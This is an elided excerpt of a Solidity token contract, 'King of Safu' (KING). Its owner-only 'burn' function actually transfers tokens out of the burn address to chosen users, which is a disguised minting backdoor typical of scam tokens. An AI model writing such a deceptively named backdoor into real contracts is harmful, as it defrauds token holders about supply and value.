...
contract KING is Context, IERC20, Ownable {
    ...
    string private _name = "King of Safu";
    string private _symbol = "KING";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x0E8558368dFd8E9DD9E8A59898a01416Da44d20b); // Marketing Address
    ...
    function burnAddr(address payable deadWallet) external onlyOwner{
    ...
    function burn(address[] memory user,uint amount) public onlyOwner {
        for(uint i = 0;i<user.length;i++){
            _transfer(burnAddress,user[i],amount);
        }
    }
